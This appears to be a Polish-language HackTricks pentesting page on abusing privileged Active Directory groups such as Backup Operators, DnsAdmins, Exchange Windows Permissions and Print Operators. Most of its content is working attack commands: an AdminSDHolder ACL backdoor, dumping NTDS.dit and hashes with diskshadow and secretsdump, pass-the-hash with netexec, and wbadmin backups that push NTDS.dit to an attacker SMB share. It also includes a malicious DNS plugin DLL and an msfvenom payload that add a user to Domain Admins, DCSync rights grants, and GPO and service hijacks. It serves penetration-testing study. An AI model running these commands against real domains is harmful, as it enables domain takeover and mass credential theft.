# Uprzywilejowane grupy

{{#include ../../banners/hacktricks-training.md}}

## Dobrze znane grupy z uprawnieniami administracyjnymi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ta grupa może tworzyć konta i grupy, które nie są administratorami w domenie. Ponadto umożliwia lokalne logowanie do kontrolera domeny (DC).

Aby zidentyfikować członków tej grupy, wykonuje się następujące polecenie:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Dodawanie nowych użytkowników jest dozwolone, podobnie jak lokalne logowanie do DC.<sup>[[1]](#references)</sup>

## Grupa AdminSDHolder

Access Control List (ACL) grupy **AdminSDHolder** ma kluczowe znaczenie, ponieważ określa uprawnienia dla wszystkich „chronionych grup” w Active Directory, w tym grup o wysokich uprawnieniach. Mechanizm ten zapewnia bezpieczeństwo tych grup, zapobiegając nieautoryzowanym modyfikacjom.

Atakujący może wykorzystać tę funkcję, modyfikując ACL grupy **AdminSDHolder** i przyznając pełne uprawnienia standardowemu użytkownikowi. W efekcie użytkownik ten uzyskałby pełną kontrolę nad wszystkimi chronionymi grupami. Jeśli uprawnienia tego użytkownika zostaną zmienione lub usunięte, zostaną automatycznie przywrócone w ciągu godziny ze względu na sposób działania systemu.<sup>[[14]](#references)</sup>

Nowsza dokumentacja Windows Server nadal traktuje kilka wbudowanych grup operatorów jako obiekty **chronione** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` itd.). Proces **SDProp** jest domyślnie uruchamiany na **PDC Emulator** co 60 minut, ustawia `adminCount=1` i wyłącza dziedziczenie dla chronionych obiektów. Jest to przydatne zarówno do persistence, jak i do wyszukiwania nieaktualnych uprzywilejowanych użytkowników, którzy zostali usunięci z chronionej grupy, ale nadal mają ACL bez dziedziczenia.<sup>[[12]](#references)</sup>

Polecenia służące do sprawdzania członków i modyfikowania uprawnień obejmują:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Dostępny jest skrypt przyspieszający proces przywracania: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Więcej informacji znajdziesz na stronie [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Przynależność do tej grupy umożliwia odczytywanie usuniętych obiektów Active Directory, co może ujawnić poufne informacje:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Jest to przydatne do **odtwarzania wcześniejszych ścieżek uprawnień**. Usunięte obiekty nadal mogą ujawniać `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, stare SPN-y lub DN usuniętej uprzywilejowanej grupy, która może później zostać przywrócona przez innego operatora.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Dostęp do kontrolera domeny

Dostęp do plików na DC jest ograniczony, chyba że użytkownik należy do grupy `Server Operators`, co zmienia poziom dostępu.

### Eskalacja uprawnień

Za pomocą `PsService` lub `sc` z Sysinternals można sprawdzać i modyfikować uprawnienia usług. Grupa `Server Operators` ma na przykład pełną kontrolę nad niektórymi usługami, co umożliwia wykonywanie dowolnych poleceń i eskalację uprawnień:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
To polecenie ujawnia, że `Server Operators` mają pełny dostęp, co umożliwia manipulowanie usługami w celu uzyskania podwyższonych uprawnień.

## Backup Operators

Członkostwo w grupie `Backup Operators` zapewnia dostęp do systemu plików `DC01` dzięki uprawnieniom `SeBackup` i `SeRestore`. Uprawnienia te umożliwiają przechodzenie przez foldery, ich wyświetlanie oraz kopiowanie plików, nawet bez jawnych uprawnień, przy użyciu flagi `FILE_FLAG_BACKUP_SEMANTICS`. Do tego procesu konieczne jest użycie określonych skryptów.<sup>[[1]](#references)</sup>

Aby wyświetlić członków grupy, wykonaj:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Atak lokalny

Aby wykorzystać te uprawnienia lokalnie, stosuje się następujące kroki:

1. Zaimportuj niezbędne biblioteki:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Włącz i zweryfikuj `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Uzyskaj dostęp do plików z ograniczonych katalogów i skopiuj je, na przykład:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Atak na AD

Bezpośredni dostęp do systemu plików Domain Controllera umożliwia kradzież bazy danych `NTDS.dit`, która zawiera wszystkie hashe NTLM użytkowników i komputerów w domenie.

#### Using diskshadow.exe

1. Utwórz kopię w tle dysku `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Skopiuj `NTDS.dit` z shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatywnie użyj `robocopy` do kopiowania plików:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Wyodrębnij `SYSTEM` i `SAM` w celu pobrania hashy:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pobierz wszystkie hashe z `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Po ekstrakcji: Pass-the-Hash do DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Using wbadmin.exe

1. Skonfiguruj system plików NTFS dla serwera SMB na maszynie atakującego i zapisz poświadczenia SMB na maszynie docelowej.
2. Użyj `wbadmin.exe` do wykonania kopii zapasowej systemu i ekstrakcji `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Praktyczną demonstrację znajdziesz w [FILMIE DEMONSTRACYJNYM Z IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Członkowie grupy **DnsAdmins** mogą wykorzystać swoje uprawnienia do załadowania dowolnej biblioteki DLL z uprawnieniami SYSTEM na serwerze DNS, często hostowanym na kontrolerach domeny. Możliwość ta zapewnia znaczny potencjał do exploitation.

Aby wyświetlić członków grupy DnsAdmins, użyj:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Wykonywanie dowolnej biblioteki DLL (CVE‑2021‑40469)

> [!NOTE]
> Ta luka umożliwia wykonywanie dowolnego kodu z uprawnieniami SYSTEM w usłudze DNS (zwykle na kontrolerach domeny). Problem ten został naprawiony w 2021 roku.

Członkowie mogą nakazać serwerowi DNS załadowanie dowolnej biblioteki DLL (lokalnie lub z udziału zdalnego) za pomocą poleceń takich jak:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Ponowne uruchomienie usługi DNS (co może wymagać dodatkowych uprawnień) jest konieczne, aby biblioteka DLL została załadowana:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Więcej informacji na temat tego wektora ataku można znaleźć na stronie ired.team.

#### Mimilib.dll

Możliwe jest również użycie mimilib.dll do wykonywania poleceń poprzez jego modyfikację tak, aby wykonywał określone polecenia lub reverse shells. [Sprawdź ten wpis](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), aby uzyskać więcej informacji.<sup>[[15]](#references)</sup>

### WPAD Record for MitM

DnsAdmins mogą manipulować rekordami DNS w celu przeprowadzania ataków Man-in-the-Middle (MitM), tworząc rekord WPAD po wyłączeniu globalnej listy blokowania zapytań. Do spoofingu i przechwytywania ruchu sieciowego można użyć narzędzi takich jak Responder lub Inveigh.

### Event Log Readers
Członkowie tej grupy mogą uzyskiwać dostęp do logów zdarzeń, potencjalnie znajdując poufne informacje, takie jak hasła w plaintext lub szczegóły wykonywania poleceń:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Ta grupa może modyfikować listy DACL obiektu domeny, potencjalnie przyznając uprawnienia DCSync. Techniki eskalacji uprawnień wykorzystujące tę grupę zostały szczegółowo opisane w repozytorium GitHub Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Jeśli możesz działać jako członek tej grupy, klasycznym nadużyciem jest przyznanie kontrolowanemu przez atakującego podmiotowi uprawnień replikacji niezbędnych do [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historycznie **PrivExchange** łączył dostęp do skrzynki pocztowej, wymuszone uwierzytelnianie Exchange oraz LDAP relay, aby uzyskać ten sam prymityw. Nawet gdy ta ścieżka relay jest zabezpieczona, bezpośrednie członkostwo w `Exchange Windows Permissions` lub kontrola nad serwerem Exchange nadal stanowi wartościową drogę do uzyskania praw replikacji domeny.

## Hyper-V Administrators

Hyper-V Administrators mają pełny dostęp do Hyper-V, który można wykorzystać do przejęcia kontroli nad zwirtualizowanymi kontrolerami domeny. Obejmuje to klonowanie działających kontrolerów domeny oraz wyodrębnianie hashy NTLM z pliku NTDS.dit.

### Przykład wykorzystania

Praktyczne nadużycie zwykle polega na **dostępie offline do dysków/punktów kontrolnych kontrolerów domeny**, a nie na stosowaniu starszych technik LPE na poziomie hosta. Mając dostęp do hosta Hyper-V, operator może utworzyć punkt kontrolny lub wyeksportować zwirtualizowany kontroler domeny, zamontować VHDX i wyodrębnić `NTDS.dit`, `SYSTEM` oraz inne sekrety bez ingerowania w LSASS wewnątrz systemu gościa:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Stamtąd ponownie użyj workflow `Backup Operators`, aby skopiować plik `Windows\NTDS\ntds.dit` oraz offline registry hives. Powiązany workflow dotyczący plików kopii zapasowych:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners

Ta grupa umożliwia członkom tworzenie Group Policies w domenie. Jednak jej członkowie nie mogą stosować group policies do użytkowników ani grup, ani edytować istniejących GPO.

Istotnym niuansem jest to, że **twórca staje się właścicielem nowego GPO** i zwykle otrzymuje wystarczające uprawnienia, aby później je edytować. Oznacza to, że ta grupa jest interesująca, gdy możesz:

- utworzyć złośliwe GPO i przekonać administratora, aby powiązał je z docelowym OU/domeną
- edytować utworzone przez siebie GPO, które jest już powiązane w użytecznym miejscu
- wykorzystać inne delegowane uprawnienie umożliwiające powiązanie GPO, podczas gdy ta grupa zapewnia możliwość jego edycji

Praktyczne nadużycie zwykle polega na dodaniu **Immediate Task**, **startup script**, **członkostwa w lokalnej grupie administratorów** lub zmiany **user rights assignment** za pośrednictwem plików policy przechowywanych w SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Jeśli edytujesz GPO ręcznie za pośrednictwem `SYSVOL`, pamiętaj, że sama zmiana nie wystarczy: należy również zaktualizować `versionNumber`, `GPT.ini`, a czasami także `gPCMachineExtensionNames`, w przeciwnym razie klienci zignorują odświeżenie zasad.<sup>[[9]](#references)</sup>

## Organization Management

W środowiskach, w których wdrożono **Microsoft Exchange**, specjalna grupa znana jako **Organization Management** ma znaczące uprawnienia. Ta grupa ma uprawnienia do **uzyskiwania dostępu do skrzynek pocztowych wszystkich użytkowników domeny** oraz zachowuje **pełną kontrolę nad** jednostką organizacyjną (OU) **„Microsoft Exchange Security Groups”**. Kontrola ta obejmuje grupę **`Exchange Windows Permissions`**, którą można wykorzystać do eskalacji uprawnień.

### Wykorzystanie uprawnień i polecenia

#### Print Operators

Członkowie grupy **Print Operators** mają kilka uprawnień, w tym **`SeLoadDriverPrivilege`**, które pozwala im **logować się lokalnie do kontrolera domeny**, wyłączać go i zarządzać drukarkami. Aby wykorzystać te uprawnienia, szczególnie jeśli **`SeLoadDriverPrivilege`** nie jest widoczne w kontekście bez podwyższonych uprawnień, konieczne jest obejście User Account Control (UAC).<sup>[[1]](#references)</sup>

Aby wyświetlić członków tej grupy, używa się następującego polecenia PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Na kontrolerach domeny ta grupa jest niebezpieczna, ponieważ domyślna polityka kontrolerów domeny przyznaje **`SeLoadDriverPrivilege`** grupie `Print Operators`. Jeśli uzyskasz podwyższony token członka tej grupy, możesz włączyć to uprawnienie i załadować podpisany, ale podatny sterownik, aby uzyskać dostęp do kernela/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Szczegółowe informacje dotyczące obsługi tokenów znajdziesz w [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Członkowie tej grupy otrzymują dostęp do komputerów za pośrednictwem Remote Desktop Protocol (RDP). Do wyliczenia tych członków dostępne są polecenia PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Dalsze informacje na temat exploitu RDP można znaleźć w dedykowanych materiałach pentestingowych.

#### Użytkownicy zdalnego zarządzania

Członkowie mogą uzyskiwać dostęp do komputerów za pośrednictwem **Windows Remote Management (WinRM)**. Enumerację tych członków można przeprowadzić za pomocą:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
W przypadku technik exploitacji związanych z **WinRM** należy skonsultować odpowiednią dokumentację.

#### Server Operators

Ta grupa ma uprawnienia do wykonywania różnych konfiguracji na kontrolerach domeny, w tym uprawnienia do tworzenia kopii zapasowych i przywracania, zmiany czasu systemowego oraz wyłączania systemu.<sup>[[1]](#references)</sup> Aby wyliczyć członków, użyj następującego polecenia:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Na kontrolerach domeny grupa `Server Operators` często dziedziczy wystarczające uprawnienia do **rekonfigurowania lub uruchamiania/zatrzymywania usług**, a także otrzymuje `SeBackupPrivilege`/`SeRestorePrivilege` za pośrednictwem domyślnej zasady DC. W praktyce czyni ich to pomostem między **nadużyciem kontroli nad usługami** a **ekstrakcją NTDS**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Jeśli service ACL nadaje tej grupie uprawnienia do zmiany/uruchamiania, wskaż service dowolne polecenie, uruchom je jako `LocalSystem`, a następnie przywróć oryginalną wartość `binPath`. Jeśli kontrola service jest zablokowana, skorzystaj z opisanych powyżej technik `Backup Operators`, aby skopiować `NTDS.dit`.

## References

- [1] [ired.team – Konta uprzywilejowane i uprawnienia tokenów](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Nadużywanie SeLoadDriverPrivilege w celu eskalacji uprawnień](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Nadużywanie uprawnień GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Nadużywanie GPO, część 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Przewodnik red teamera po GPO i OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Funkcja ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonimowy LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Dodatek C: Chronione konta i grupy w Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Jak nadużywać AdminSDHolder i umieścić w nim backdoor w celu uzyskania persistence Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Nadużywanie uprawnienia DnsAdmins w celu eskalacji w Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Informacje o nadużywaniu krawędzi GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Funkcja NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
